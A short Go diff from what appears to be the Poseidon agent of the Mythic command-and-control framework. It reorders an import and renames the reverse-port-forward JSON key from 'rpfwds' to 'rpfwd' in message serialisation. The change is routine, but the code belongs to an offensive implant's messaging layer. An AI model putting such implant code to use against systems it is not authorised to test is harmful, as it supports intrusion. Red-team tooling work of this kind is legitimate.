@@ -2,9 +2,10 @@ package structs
 
 import (
 	"encoding/json"
-	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/pkg/utils/enums/InteractiveTask"
 	"os"
 	"time"
+
+	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/pkg/utils/enums/InteractiveTask"
 )
 
 // Profile is the primary client interface for Mythic C2 profiles
@@ -191,7 +192,7 @@ func (e MythicMessage) MarshalJSON() ([]byte, error) {
 		alias["socks"] = *e.Socks
 	}
 	if e.Rpfwds != nil && len(*e.Rpfwds) > 0 {
-		alias["rpfwds"] = *e.Rpfwds
+		alias["rpfwd"] = *e.Rpfwds
 	}
 	if e.Edges != nil && len(*e.Edges) > 0 {
 		alias["edges"] = *e.Edges
